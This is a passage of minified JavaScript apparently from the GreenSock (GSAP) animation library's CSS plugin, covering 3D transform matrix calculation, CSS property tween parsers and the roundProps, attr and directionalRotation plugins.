                    for (d = n.ieOffsetX || 0, p = n.ieOffsetY || 0, n.ieOffsetX = Math.round((f - ((a < 0 ? -a: a) * f + (o < 0 ? -o: o) * g)) / 2 + y), n.ieOffsetY = Math.round((g - ((c < 0 ? -c: c) * g + (l < 0 ? -l: l) * f)) / 2 + b), gt = 0; gt < 4; gt++) k = K[gt],
                    w = u[k],
                    i = w.indexOf("px") !== -1 ? parseFloat(w) : V(this.t, k, parseFloat(w), w.replace(x, "")) || 0,
                    S = i !== n[k] ? gt < 2 ? -n.ieOffsetX: -n.ieOffsetY: gt < 2 ? d - n.ieOffsetX: p - n.ieOffsetY,
                    h[k] = (n[k] = Math.round(i - S * (0 === gt || 2 === gt ? 1 : C))) + "px"
                }
            }
        },
        Nt = q.set3DTransformRatio = q.setTransformRatio = function(t) {
            var e, i, n, r, s, a, o, l, c, h, u, d, f, m, g, v, _, y, b, w, x, T, k, S = this.data,
            C = this.t.style,
            P = S.rotation,
            R = S.rotationX,
            A = S.rotationY,
            M = S.scaleX,
            E = S.scaleY,
            z = S.scaleZ,
            F = S.x,
            I = S.y,
            D = S.z,
            L = S.svg,
            q = S.perspective,
            N = S.force3D,
            $ = S.skewY,
            B = S.skewX;
            if ($ && (B += $, P += $), ((1 === t || 0 === t) && "auto" === N && (this.tween._totalTime === this.tween._totalDuration || !this.tween._totalTime) || !N) && !D && !q && !A && !R && 1 === z || bt && L || !St) return void(P || B || L ? (P *= O, T = B * O, k = 1e5, i = Math.cos(P) * M, s = Math.sin(P) * M, n = Math.sin(P - T) * -E, a = Math.cos(P - T) * E, T && "simple" === S.skewType && (e = Math.tan(T - $ * O), e = Math.sqrt(1 + e * e), n *= e, a *= e, $ && (e = Math.tan($ * O), e = Math.sqrt(1 + e * e), i *= e, s *= e)), L && (F += S.xOrigin - (S.xOrigin * i + S.yOrigin * n) + S.xOffset, I += S.yOrigin - (S.xOrigin * s + S.yOrigin * a) + S.yOffset, bt && (S.xPercent || S.yPercent) && (g = this.t.getBBox(), F += .01 * S.xPercent * g.width, I += .01 * S.yPercent * g.height), g = 1e-6, F < g && F > -g && (F = 0), I < g && I > -g && (I = 0)), b = (i * k | 0) / k + "," + (s * k | 0) / k + "," + (n * k | 0) / k + "," + (a * k | 0) / k + "," + F + "," + I + ")", L && bt ? this.t.setAttribute("transform", "matrix(" + b) : C[xt] = (S.xPercent || S.yPercent ? "translate(" + S.xPercent + "%," + S.yPercent + "%) matrix(": "matrix(") + b) : C[xt] = (S.xPercent || S.yPercent ? "translate(" + S.xPercent + "%," + S.yPercent + "%) matrix(": "matrix(") + M + ",0,0," + E + "," + F + "," + I + ")");
            if (p && (g = 1e-4, M < g && M > -g && (M = z = 2e-5), E < g && E > -g && (E = z = 2e-5), !q || S.z || S.rotationX || S.rotationY || (q = 0)), P || B) P *= O,
            v = i = Math.cos(P),
            _ = s = Math.sin(P),
            B && (P -= B * O, v = Math.cos(P), _ = Math.sin(P), "simple" === S.skewType && (e = Math.tan((B - $) * O), e = Math.sqrt(1 + e * e), v *= e, _ *= e, S.skewY && (e = Math.tan($ * O), e = Math.sqrt(1 + e * e), i *= e, s *= e))),
            n = -_,
            a = v;
            else {
                if (! (A || R || 1 !== z || q || L)) return void(C[xt] = (S.xPercent || S.yPercent ? "translate(" + S.xPercent + "%," + S.yPercent + "%) translate3d(": "translate3d(") + F + "px," + I + "px," + D + "px)" + (1 !== M || 1 !== E ? " scale(" + M + "," + E + ")": ""));
                i = a = 1,
                n = s = 0
            }
            h = 1,
            r = o = l = c = u = d = 0,
            f = q ? -1 / q: 0,
            m = S.zOrigin,
            g = 1e-6,
            w = ",",
            x = "0",
            P = A * O,
            P && (v = Math.cos(P), _ = Math.sin(P), l = -_, u = f * -_, r = i * _, o = s * _, h = v, f *= v, i *= v, s *= v),
            P = R * O,
            P && (v = Math.cos(P), _ = Math.sin(P), e = n * v + r * _, y = a * v + o * _, c = h * _, d = f * _, r = n * -_ + r * v, o = a * -_ + o * v, h *= v, f *= v, n = e, a = y),
            1 !== z && (r *= z, o *= z, h *= z, f *= z),
            1 !== E && (n *= E, a *= E, c *= E, d *= E),
            1 !== M && (i *= M, s *= M, l *= M, u *= M),
            (m || L) && (m && (F += r * -m, I += o * -m, D += h * -m + m), L && (F += S.xOrigin - (S.xOrigin * i + S.yOrigin * n) + S.xOffset, I += S.yOrigin - (S.xOrigin * s + S.yOrigin * a) + S.yOffset), F < g && F > -g && (F = x), I < g && I > -g && (I = x), D < g && D > -g && (D = 0)),
            b = S.xPercent || S.yPercent ? "translate(" + S.xPercent + "%," + S.yPercent + "%) matrix3d(": "matrix3d(",
            b += (i < g && i > -g ? x: i) + w + (s < g && s > -g ? x: s) + w + (l < g && l > -g ? x: l),
            b += w + (u < g && u > -g ? x: u) + w + (n < g && n > -g ? x: n) + w + (a < g && a > -g ? x: a),
            R || A || 1 !== z ? (b += w + (c < g && c > -g ? x: c) + w + (d < g && d > -g ? x: d) + w + (r < g && r > -g ? x: r), b += w + (o < g && o > -g ? x: o) + w + (h < g && h > -g ? x: h) + w + (f < g && f > -g ? x: f) + w) : b += ",0,0,0,0,1,0,",
            b += F + w + I + w + D + w + (q ? 1 + -D / q: 1) + ")",
            C[xt] = b
        };
        c = Ct.prototype,
        c.x = c.y = c.z = c.skewX = c.skewY = c.rotation = c.rotationX = c.rotationY = c.zOrigin = c.xPercent = c.yPercent = c.xOffset = c.yOffset = 0,
        c.scaleX = c.scaleY = c.scaleZ = 1,
        _t("transform,scale,scaleX,scaleY,scaleZ,x,y,z,rotation,rotationX,rotationY,rotationZ,skewX,skewY,shortRotation,shortRotationX,shortRotationY,shortRotationZ,transformOrigin,svgOrigin,transformPerspective,directionalRotation,parseTransform,force3D,skewType,xPercent,yPercent,smoothOrigin", {
            parser: function(t, e, i, n, s, o, l) {
                if (n._lastParsedTransform === l) return s;
                n._lastParsedTransform = l;
                var c, h = l.scale && "function" == typeof l.scale ? l.scale: 0;
                "function" == typeof l[i] && (c = l[i], l[i] = e),
                h && (l.scale = h(v, t));
                var u, d, p, f, m, _, y, b, w, x = t._gsTransform,
                T = t.style,
                k = wt.length,
                S = l,
                C = {},
                P = Lt(t, r, !0, S.parseTransform),
                R = S.transform && ("function" == typeof S.transform ? S.transform(v, g) : S.transform);
                if (n._transform = P, R && "string" == typeof R && xt) d = D.style,
                d[xt] = R,
                d.display = "block",
                d.position = "absolute",
                F.body.appendChild(D),
                u = Lt(D, null, !1),
                P.svg && (_ = P.xOrigin, y = P.yOrigin, u.x -= P.xOffset, u.y -= P.yOffset, (S.transformOrigin || S.svgOrigin) && (R = {},
                Mt(t, et(S.transformOrigin), R, S.svgOrigin, S.smoothOrigin, !0), _ = R.xOrigin, y = R.yOrigin, u.x -= R.xOffset - P.xOffset, u.y -= R.yOffset - P.yOffset), (_ || y) && (b = Dt(D, !0), u.x -= _ - (_ * b[0] + y * b[2]), u.y -= y - (_ * b[1] + y * b[3]))),
                F.body.removeChild(D),
                u.perspective || (u.perspective = P.perspective),
                null != S.xPercent && (u.xPercent = nt(S.xPercent, P.xPercent)),
                null != S.yPercent && (u.yPercent = nt(S.yPercent, P.yPercent));
                else if ("object" == typeof S) {
                    if (u = {
                        scaleX: nt(null != S.scaleX ? S.scaleX: S.scale, P.scaleX),
                        scaleY: nt(null != S.scaleY ? S.scaleY: S.scale, P.scaleY),
                        scaleZ: nt(S.scaleZ, P.scaleZ),
                        x: nt(S.x, P.x),
                        y: nt(S.y, P.y),
                        z: nt(S.z, P.z),
                        xPercent: nt(S.xPercent, P.xPercent),
                        yPercent: nt(S.yPercent, P.yPercent),
                        perspective: nt(S.transformPerspective, P.perspective)
                    },
                    null != (m = S.directionalRotation)) if ("object" == typeof m) for (d in m) S[d] = m[d];
                    else S.rotation = m;
                    "string" == typeof S.x && S.x.indexOf("%") !== -1 && (u.x = 0, u.xPercent = nt(S.x, P.xPercent)),
                    "string" == typeof S.y && S.y.indexOf("%") !== -1 && (u.y = 0, u.yPercent = nt(S.y, P.yPercent)),
                    u.rotation = rt("rotation" in S ? S.rotation: "shortRotation" in S ? S.shortRotation + "_short": "rotationZ" in S ? S.rotationZ: P.rotation, P.rotation, "rotation", C),
                    St && (u.rotationX = rt("rotationX" in S ? S.rotationX: "shortRotationX" in S ? S.shortRotationX + "_short": P.rotationX || 0, P.rotationX, "rotationX", C), u.rotationY = rt("rotationY" in S ? S.rotationY: "shortRotationY" in S ? S.shortRotationY + "_short": P.rotationY || 0, P.rotationY, "rotationY", C)),
                    u.skewX = rt(S.skewX, P.skewX),
                    u.skewY = rt(S.skewY, P.skewY)
                }
                for (St && null != S.force3D && (P.force3D = S.force3D, f = !0), P.skewType = S.skewType || P.skewType || a.defaultSkewType, p = P.force3D || P.z || P.rotationX || P.rotationY || u.z || u.rotationX || u.rotationY || u.perspective, p || null == S.scale || (u.scaleZ = 1); --k > -1;) w = wt[k],
                ((R = u[w] - P[w]) > 1e-6 || R < -1e-6 || null != S[w] || null != E[w]) && (f = !0, s = new pt(P, w, P[w], R, s), w in C && (s.e = C[w]), s.xs0 = 0, s.plugin = o, n._overwriteProps.push(s.n));
                return R = S.transformOrigin,
                P.svg && (R || S.svgOrigin) && (_ = P.xOffset, y = P.yOffset, Mt(t, et(R), u, S.svgOrigin, S.smoothOrigin), s = ft(P, "xOrigin", (x ? P: u).xOrigin, u.xOrigin, s, "transformOrigin"), s = ft(P, "yOrigin", (x ? P: u).yOrigin, u.yOrigin, s, "transformOrigin"), _ === P.xOffset && y === P.yOffset || (s = ft(P, "xOffset", x ? _: P.xOffset, P.xOffset, s, "transformOrigin"), s = ft(P, "yOffset", x ? y: P.yOffset, P.yOffset, s, "transformOrigin")), R = "0px 0px"),
                (R || St && p && P.zOrigin) && (xt ? (f = !0, w = kt, R = (R || U(t, w, r, !1, "50% 50%")) + "", s = new pt(T, w, 0, 0, s, -1, "transformOrigin"), s.b = T[w], s.plugin = o, St ? (d = P.zOrigin, R = R.split(" "), P.zOrigin = (R.length > 2 && (0 === d || "0px" !== R[2]) ? parseFloat(R[2]) : d) || 0, s.xs0 = s.e = R[0] + " " + (R[1] || "50%") + " 0px", s = new pt(P, "zOrigin", 0, 0, s, -1, s.n), s.b = d, s.xs0 = s.e = P.zOrigin) : s.xs0 = s.e = R) : et(R + "", P)),
                f && (n._transformType = P.svg && bt || !p && 3 !== this._transformType ? 2 : 3),
                c && (l[i] = c),
                h && (l.scale = h),
                s
            },
            prefix: !0
        }),
        _t("boxShadow", {
            defaultValue: "0px 0px 0px 0px #999",
            prefix: !0,
            color: !0,
            multi: !0,
            keyword: "inset"
        }),
        _t("borderRadius", {
            defaultValue: "0px",
            parser: function(t, e, i, s, a, o) {
                e = this.format(e);
                var l, c, h, u, d, p, f, m, g, v, _, y, b, w, x, T, k = ["borderTopLeftRadius", "borderTopRightRadius", "borderBottomRightRadius", "borderBottomLeftRadius"],
                S = t.style;
                for (g = parseFloat(t.offsetWidth), v = parseFloat(t.offsetHeight), l = e.split(" "), c = 0; c < k.length; c++) this.p.indexOf("border") && (k[c] = H(k[c])),
                d = u = U(t, k[c], r, !1, "0px"),
                d.indexOf(" ") !== -1 && (u = d.split(" "), d = u[0], u = u[1]),
                p = h = l[c],
                f = parseFloat(d),
                y = d.substr((f + "").length),
                b = "=" === p.charAt(1),
                b ? (m = parseInt(p.charAt(0) + "1", 10), p = p.substr(2), m *= parseFloat(p), _ = p.substr((m + "").length - (m < 0 ? 1 : 0)) || "") : (m = parseFloat(p), _ = p.substr((m + "").length)),
                "" === _ && (_ = n[i] || y),
                _ !== y && (w = V(t, "borderLeft", f, y), x = V(t, "borderTop", f, y), "%" === _ ? (d = w / g * 100 + "%", u = x / v * 100 + "%") : "em" === _ ? (T = V(t, "borderLeft", 1, "em"), d = w / T + "em", u = x / T + "em") : (d = w + "px", u = x + "px"), b && (p = parseFloat(d) + m + _, h = parseFloat(u) + m + _)),
                a = mt(S, k[c], d + " " + u, p + " " + h, !1, "0px", a);
                return a
            },
            prefix: !0,
            formatter: ht("0px 0px 0px 0px", !1, !0)
        }),
        _t("borderBottomLeftRadius,borderBottomRightRadius,borderTopLeftRadius,borderTopRightRadius", {
            defaultValue: "0px",
            parser: function(t, e, i, n, s, a) {
                return mt(t.style, i, this.format(U(t, i, r, !1, "0px 0px")), this.format(e), !1, "0px", s)
            },
            prefix: !0,
            formatter: ht("0px 0px", !1, !0)
        }),
        _t("backgroundPosition", {
            defaultValue: "0 0",
            parser: function(t, e, i, n, s, a) {
                var o, l, c, h, u, d, p = "background-position",
                f = r || Y(t, null),
                g = this.format((f ? m ? f.getPropertyValue(p + "-x") + " " + f.getPropertyValue(p + "-y") : f.getPropertyValue(p) : t.currentStyle.backgroundPositionX + " " + t.currentStyle.backgroundPositionY) || "0 0"),
                v = this.format(e);
                if (g.indexOf("%") !== -1 != (v.indexOf("%") !== -1) && v.split(",").length < 2 && (d = U(t, "backgroundImage").replace(/(^(?:url\(\"|url\())|(?:(\"\))$|\)$)/gi, "")) && "none" !== d) {
                    for (o = g.split(" "), l = v.split(" "), L.setAttribute("src", d), c = 2; --c > -1;) g = o[c],
                    (h = g.indexOf("%") !== -1) !== (l[c].indexOf("%") !== -1) && (u = 0 === c ? t.offsetWidth - L.width: t.offsetHeight - L.height, o[c] = h ? parseFloat(g) / 100 * u + "px": parseFloat(g) / u * 100 + "%");
                    g = o.join(" ")
                }
                return this.parseComplex(t.style, g, v, s, a)
            },
            formatter: et
        }),
        _t("backgroundSize", {
            defaultValue: "0 0",
            formatter: function(t) {
                return t += "",
                et(t.indexOf(" ") === -1 ? t + " " + t: t)
            }
        }),
        _t("perspective", {
            defaultValue: "0px",
            prefix: !0
        }),
        _t("perspectiveOrigin", {
            defaultValue: "50% 50%",
            prefix: !0
        }),
        _t("transformStyle", {
            prefix: !0
        }),
        _t("backfaceVisibility", {
            prefix: !0
        }),
        _t("userSelect", {
            prefix: !0
        }),
        _t("margin", {
            parser: ut("marginTop,marginRight,marginBottom,marginLeft")
        }),
        _t("padding", {
            parser: ut("paddingTop,paddingRight,paddingBottom,paddingLeft")
        }),
        _t("clip", {
            defaultValue: "rect(0px,0px,0px,0px)",
            parser: function(t, e, i, n, s, a) {
                var o, l, c;
                return m < 9 ? (l = t.currentStyle, c = m < 8 ? " ": ",", o = "rect(" + l.clipTop + c + l.clipRight + c + l.clipBottom + c + l.clipLeft + ")", e = this.format(e).split(",").join(c)) : (o = this.format(U(t, this.p, r, !1, this.dflt)), e = this.format(e)),
                this.parseComplex(t.style, o, e, s, a)
            }
        }),
        _t("textShadow", {
            defaultValue: "0px 0px 0px #999",
            color: !0,
            multi: !0
        }),
        _t("autoRound,strictUnits", {
            parser: function(t, e, i, n, r) {
                return r
            }
        }),
        _t("border", {
            defaultValue: "0px solid #000",
            parser: function(t, e, i, n, s, a) {
                var o = U(t, "borderTopWidth", r, !1, "0px"),
                l = this.format(e).split(" "),
                c = l[0].replace(x, "");
                return "px" !== c && (o = parseFloat(o) / V(t, "borderTopWidth", 1, c) + c),
                this.parseComplex(t.style, this.format(o + " " + U(t, "borderTopStyle", r, !1, "solid") + " " + U(t, "borderTopColor", r, !1, "#000")), l.join(" "), s, a)
            },
            color: !0,
            formatter: function(t) {
                var e = t.split(" ");
                return e[0] + " " + (e[1] || "solid") + " " + (t.match(ct) || ["#000"])[0]
            }
        }),
        _t("borderWidth", {
            parser: ut("borderTopWidth,borderRightWidth,borderBottomWidth,borderLeftWidth")
        }),
        _t("float,cssFloat,styleFloat", {
            parser: function(t, e, i, n, r, s) {
                var a = t.style,
                o = "cssFloat" in a ? "cssFloat": "styleFloat";
                return new pt(a, o, 0, 0, r, -1, i, !1, 0, a[o], e)
            }
        });
        var $t = function(t) {
            var e, i = this.t,
            n = i.filter || U(this.data, "filter") || "",
            r = this.s + this.c * t | 0;
            100 === r && (n.indexOf("atrix(") === -1 && n.indexOf("radient(") === -1 && n.indexOf("oader(") === -1 ? (i.removeAttribute("filter"), e = !U(this.data, "filter")) : (i.filter = n.replace(/alpha\(opacity *=.+?\)/i, ""), e = !0)),
            e || (this.xn1 && (i.filter = n = n || "alpha(opacity=" + r + ")"), n.indexOf("pacity") === -1 ? 0 === r && this.xn1 || (i.filter = n + " alpha(opacity=" + r + ")") : i.filter = n.replace(T, "opacity=" + r))
        };
        _t("opacity,alpha,autoAlpha", {
            defaultValue: "1",
            parser: function(t, e, i, n, s, a) {
                var o = parseFloat(U(t, "opacity", r, !1, "1")),
                l = t.style,
                c = "autoAlpha" === i;
                return "string" == typeof e && "=" === e.charAt(1) && (e = ("-" === e.charAt(0) ? -1 : 1) * parseFloat(e.substr(2)) + o),
                c && 1 === o && "hidden" === U(t, "visibility", r) && 0 !== e && (o = 0),
                $ ? s = new pt(l, "opacity", o, e - o, s) : (s = new pt(l, "opacity", 100 * o, 100 * (e - o), s), s.xn1 = c ? 1 : 0, l.zoom = 1, s.type = 2, s.b = "alpha(opacity=" + s.s + ")", s.e = "alpha(opacity=" + (s.s + s.c) + ")", s.data = t, s.plugin = a, s.setRatio = $t),
                c && (s = new pt(l, "visibility", 0, 0, s, -1, null, !1, 0, 0 !== o ? "inherit": "hidden", 0 === e ? "hidden": "inherit"), s.xs0 = "inherit", n._overwriteProps.push(s.n), n._overwriteProps.push(i)),
                s
            }
        });
        var Bt = function(t, e) {
            e && (t.removeProperty ? ("ms" !== e.substr(0, 2) && "webkit" !== e.substr(0, 6) || (e = "-" + e), t.removeProperty(e.replace(/([A-Z])/g, "-$1").toLowerCase())) : t.removeAttribute(e))
        },
        jt = function(t) {
            if (this.t._gsClassPT = this, 1 === t || 0 === t) {
                this.t.setAttribute("class", 0 === t ? this.b: this.e);
                for (var e = this.data,
                i = this.t.style; e;) e.v ? i[e.p] = e.v: Bt(i, e.p),
                e = e._next;
                1 === t && this.t._gsClassPT === this && (this.t._gsClassPT = null)
            } else this.t.getAttribute("class") !== this.e && this.t.setAttribute("class", this.e)
        };
        _t("className", {
            parser: function(t, e, n, s, a, o, l) {
                var c, h, u, d, p, f = t.getAttribute("class") || "",
                m = t.style.cssText;
                if (a = s._classNamePT = new pt(t, n, 0, 0, a, 2), a.setRatio = jt, a.pr = -11, i = !0, a.b = f, h = Z(t, r), u = t._gsClassPT) {
                    for (d = {},
                    p = u.data; p;) d[p.p] = 1,
                    p = p._next;
                    u.setRatio(1)
                }
                return t._gsClassPT = a,
                a.e = "=" !== e.charAt(1) ? e: f.replace(new RegExp("(?:\\s|^)" + e.substr(2) + "(?![\\w-])"), "") + ("+" === e.charAt(0) ? " " + e.substr(2) : ""),
                t.setAttribute("class", a.e),
                c = Q(t, h, Z(t), l, d),
                t.setAttribute("class", f),
                a.data = c.firstMPT,
                t.style.cssText = m,
                a = a.xfirst = s.parse(t, c.difs, a, o)
            }
        });
        var Wt = function(t) {
            if ((1 === t || 0 === t) && this.data._totalTime === this.data._totalDuration && "isFromStart" !== this.data.data) {
                var e, i, n, r, s, a = this.t.style,
                o = l.transform.parse;
                if ("all" === this.e) a.cssText = "",
                r = !0;
                else for (e = this.e.split(" ").join("").split(","), n = e.length; --n > -1;) i = e[n],
                l[i] && (l[i].parse === o ? r = !0 : i = "transformOrigin" === i ? kt: l[i].p),
                Bt(a, i);
                r && (Bt(a, xt), (s = this.t._gsTransform) && (s.svg && (this.t.removeAttribute("data-svg-origin"), this.t.removeAttribute("transform")), delete this.t._gsTransform))
            }
        };
        for (_t("clearProps", {
            parser: function(t, e, n, r, s) {
                return s = new pt(t, n, 0, 0, s, 2),
                s.setRatio = Wt,
                s.e = e,
                s.pr = -10,
                s.data = r._tween,
                i = !0,
                s
            }
        }), c = "bezier,throwProps,physicsProps,physics2D".split(","), gt = c.length; gt--;) yt(c[gt]);
        c = a.prototype,
        c._firstPT = c._lastParsedTransform = c._transform = null,
        c._onInitTween = function(t, e, o, c) {
            if (!t.nodeType) return ! 1;
            this._target = g = t,
            this._tween = o,
            this._vars = e,
            v = c,
            h = e.autoRound,
            i = !1,
            n = e.suffixMap || a.suffixMap,
            r = Y(t, ""),
            s = this._overwriteProps;
            var p, m, _, y, b, w, x, T, S, C = t.style;
            if (u && "" === C.zIndex && ("auto" !== (p = U(t, "zIndex", r)) && "" !== p || this._addLazySet(C, "zIndex", 0)), "string" == typeof e && (y = C.cssText, p = Z(t, r), C.cssText = y + ";" + e, p = Q(t, p, Z(t)).difs, !$ && k.test(e) && (p.opacity = parseFloat(RegExp.$1)), e = p, C.cssText = y), e.className ? this._firstPT = m = l.className.parse(t, e.className, "className", this, null, null, e) : this._firstPT = m = this.parse(t, e, null), this._transformType) {
                for (S = 3 === this._transformType, xt ? d && (u = !0, "" === C.zIndex && ("auto" !== (x = U(t, "zIndex", r)) && "" !== x || this._addLazySet(C, "zIndex", 0)), f && this._addLazySet(C, "WebkitBackfaceVisibility", this._vars.WebkitBackfaceVisibility || (S ? "visible": "hidden"))) : C.zoom = 1, _ = m; _ && _._next;) _ = _._next;
                T = new pt(t, "transform", 0, 0, null, 2),
                this._linkCSSP(T, null, _),
                T.setRatio = xt ? Nt: qt,
                T.data = this._transform || Lt(t, r, !0),
                T.tween = o,
                T.pr = -1,
                s.pop()
            }
            if (i) {
                for (; m;) {
                    for (w = m._next, _ = y; _ && _.pr > m.pr;) _ = _._next; (m._prev = _ ? _._prev: b) ? m._prev._next = m: y = m,
                    (m._next = _) ? _._prev = m: b = m,
                    m = w
                }
                this._firstPT = y
            }
            return ! 0
        },
        c.parse = function(t, e, i, s) {
            var a, o, c, u, d, p, f, m, _, y, b = t.style;
            for (a in e) p = e[a],
            "function" == typeof p && (p = p(v, g)),
            o = l[a],
            o ? i = o.parse(t, p, a, this, i, s, e) : (d = U(t, a, r) + "", _ = "string" == typeof p, "color" === a || "fill" === a || "stroke" === a || a.indexOf("Color") !== -1 || _ && S.test(p) ? (_ || (p = ot(p), p = (p.length > 3 ? "rgba(": "rgb(") + p.join(",") + ")"), i = mt(b, a, d, p, !0, "transparent", i, 0, s)) : _ && A.test(p) ? i = mt(b, a, d, p, !0, null, i, 0, s) : (c = parseFloat(d), f = c || 0 === c ? d.substr((c + "").length) : "", "" !== d && "auto" !== d || ("width" === a || "height" === a ? (c = tt(t, a, r), f = "px") : "left" === a || "top" === a ? (c = G(t, a, r), f = "px") : (c = "opacity" !== a ? 0 : 1, f = "")), y = _ && "=" === p.charAt(1), y ? (u = parseInt(p.charAt(0) + "1", 10), p = p.substr(2), u *= parseFloat(p), m = p.replace(x, "")) : (u = parseFloat(p), m = _ ? p.replace(x, "") : ""), "" === m && (m = a in n ? n[a] : f), p = u || 0 === u ? (y ? u + c: u) + m: e[a], f !== m && "" !== m && (u || 0 === u) && c && (c = V(t, a, c, f), "%" === m ? (c /= V(t, a, 100, "%") / 100, e.strictUnits !== !0 && (d = c + "%")) : "em" === m || "rem" === m || "vw" === m || "vh" === m ? c /= V(t, a, 1, m) : "px" !== m && (u = V(t, a, u, m), m = "px"), y && (u || 0 === u) && (p = u + c + m)), y && (u += c), !c && 0 !== c || !u && 0 !== u ? void 0 !== b[a] && (p || p + "" != "NaN" && null != p) ? (i = new pt(b, a, u || c || 0, 0, i, -1, a, !1, 0, d, p), i.xs0 = "none" !== p || "display" !== a && a.indexOf("Style") === -1 ? p: d) : j("invalid " + a + " tween value: " + e[a]) : (i = new pt(b, a, c, u - c, i, 0, a, h !== !1 && ("px" === m || "zIndex" === a), 0, d, p), i.xs0 = m))),
            s && i && !i.plugin && (i.plugin = s);
            return i
        },
        c.setRatio = function(t) {
            var e, i, n, r = this._firstPT;
            if (1 !== t || this._tween._time !== this._tween._duration && 0 !== this._tween._time) if (t || this._tween._time !== this._tween._duration && 0 !== this._tween._time || this._tween._rawPrevTime === -1e-6) for (; r;) {
                if (e = r.c * t + r.s, r.r ? e = Math.round(e) : e < 1e-6 && e > -1e-6 && (e = 0), r.type) if (1 === r.type) if (2 === (n = r.l)) r.t[r.p] = r.xs0 + e + r.xs1 + r.xn1 + r.xs2;
                else if (3 === n) r.t[r.p] = r.xs0 + e + r.xs1 + r.xn1 + r.xs2 + r.xn2 + r.xs3;
                else if (4 === n) r.t[r.p] = r.xs0 + e + r.xs1 + r.xn1 + r.xs2 + r.xn2 + r.xs3 + r.xn3 + r.xs4;
                else if (5 === n) r.t[r.p] = r.xs0 + e + r.xs1 + r.xn1 + r.xs2 + r.xn2 + r.xs3 + r.xn3 + r.xs4 + r.xn4 + r.xs5;
                else {
                    for (i = r.xs0 + e + r.xs1, n = 1; n < r.l; n++) i += r["xn" + n] + r["xs" + (n + 1)];
                    r.t[r.p] = i
                } else r.type === -1 ? r.t[r.p] = r.xs0: r.setRatio && r.setRatio(t);
                else r.t[r.p] = e + r.xs0;
                r = r._next
            } else for (; r;) 2 !== r.type ? r.t[r.p] = r.b: r.setRatio(t),
            r = r._next;
            else for (; r;) {
                if (2 !== r.type) if (r.r && r.type !== -1) if (e = Math.round(r.s + r.c), r.type) {
                    if (1 === r.type) {
                        for (n = r.l, i = r.xs0 + e + r.xs1, n = 1; n < r.l; n++) i += r["xn" + n] + r["xs" + (n + 1)];
                        r.t[r.p] = i
                    }
                } else r.t[r.p] = e + r.xs0;
                else r.t[r.p] = r.e;
                else r.setRatio(t);
                r = r._next
            }
        },
        c._enableTransforms = function(t) {
            this._transform = this._transform || Lt(this._target, r, !0),
            this._transformType = this._transform.svg && bt || !t && 3 !== this._transformType ? 2 : 3
        };
        var Xt = function(t) {
            this.t[this.p] = this.e,
            this.data._linkCSSP(this, this._next, null, !0)
        };
        c._addLazySet = function(t, e, i) {
            var n = this._firstPT = new pt(t, e, 0, 0, this._firstPT, 2);
            n.e = i,
            n.setRatio = Xt,
            n.data = this
        },
        c._linkCSSP = function(t, e, i, n) {
            return t && (e && (e._prev = t), t._next && (t._next._prev = t._prev), t._prev ? t._prev._next = t._next: this._firstPT === t && (this._firstPT = t._next, n = !0), i ? i._next = t: n || null !== this._firstPT || (this._firstPT = t), t._next = e, t._prev = i),
            t
        },
        c._mod = function(t) {
            for (var e = this._firstPT; e;)"function" == typeof t[e.p] && t[e.p] === Math.round && (e.r = 1),
            e = e._next
        },
        c._kill = function(e) {
            var i, n, r, s = e;
            if (e.autoAlpha || e.alpha) {
                s = {};
                for (n in e) s[n] = e[n];
                s.opacity = 1,
                s.autoAlpha && (s.visibility = 1)
            }
            for (e.className && (i = this._classNamePT) && (r = i.xfirst, r && r._prev ? this._linkCSSP(r._prev, i._next, r._prev._prev) : r === this._firstPT && (this._firstPT = i._next), i._next && this._linkCSSP(i._next, i._next._next, r._prev), this._classNamePT = null), i = this._firstPT; i;) i.plugin && i.plugin !== n && i.plugin._kill && (i.plugin._kill(e), n = i.plugin),
            i = i._next;
            return t.prototype._kill.call(this, s)
        };
        var Ht = function(t, e, i) {
            var n, r, s, a;
            if (t.slice) for (r = t.length; --r > -1;) Ht(t[r], e, i);
            else for (n = t.childNodes, r = n.length; --r > -1;) s = n[r],
            a = s.type,
            s.style && (e.push(Z(s)), i && i.push(s)),
            1 !== a && 9 !== a && 11 !== a || !s.childNodes.length || Ht(s, e, i)
        };
        return a.cascadeTo = function(t, i, n) {
            var r, s, a, o, l = e.to(t, i, n),
            c = [l],
            h = [],
            u = [],
            d = [],
            p = e._internals.reservedProps;
            for (t = l._targets || l.target, Ht(t, h, d), l.render(i, !0, !0), Ht(t, u), l.render(0, !0, !0), l._enabled(!0), r = d.length; --r > -1;) if (s = Q(d[r], h[r], u[r]), s.firstMPT) {
                s = s.difs;
                for (a in n) p[a] && (s[a] = n[a]);
                o = {};
                for (a in s) o[a] = h[r][a];
                c.push(e.fromTo(d[r], i, o, s))
            }
            return c
        },
        t.activate([a]),
        a
    },
    !0),
    function() {
        var t = _gsScope._gsDefine.plugin({
            propName: "roundProps",
            version: "1.6.0",
            priority: -1,
            API: 2,
            init: function(t, e, i) {
                return this._tween = i,
                !0
            }
        }),
        e = function(t) {
            for (; t;) t.f || t.blob || (t.m = Math.round),
            t = t._next
        },
        i = t.prototype;
        i._onInitAllProps = function() {
            for (var t, i, n, r = this._tween,
            s = r.vars.roundProps.join ? r.vars.roundProps: r.vars.roundProps.split(","), a = s.length, o = {},
            l = r._propLookup.roundProps; --a > -1;) o[s[a]] = Math.round;
            for (a = s.length; --a > -1;) for (t = s[a], i = r._firstPT; i;) n = i._next,
            i.pg ? i.t._mod(o) : i.n === t && (2 === i.f && i.t ? e(i.t._firstPT) : (this._add(i.t, t, i.s, i.c), n && (n._prev = i._prev), i._prev ? i._prev._next = n: r._firstPT === i && (r._firstPT = n), i._next = i._prev = null, r._propLookup[t] = l)),
            i = n;
            return ! 1
        },
        i._add = function(t, e, i, n) {
            this._addTween(t, e, i, i + n, e, Math.round),
            this._overwriteProps.push(e)
        }
    } (),
    function() {
        _gsScope._gsDefine.plugin({
            propName: "attr",
            API: 2,
            version: "0.6.0",
            init: function(t, e, i, n) {
                var r, s;
                if ("function" != typeof t.setAttribute) return ! 1;
                for (r in e) s = e[r],
                "function" == typeof s && (s = s(n, t)),
                this._addTween(t, "setAttribute", t.getAttribute(r) + "", s + "", r, !1, r),
                this._overwriteProps.push(r);
                return ! 0
            }
        })
    } (),
    _gsScope._gsDefine.plugin({
        propName: "directionalRotation",
        version: "0.3.0",
        API: 2,
        init: function(t, e, i, n) {
            "object" != typeof e && (e = {
                rotation: e
            }),
            this.finals = {};
            var r, s, a, o, l, c, h = e.useRadians === !0 ? 2 * Math.PI: 360;
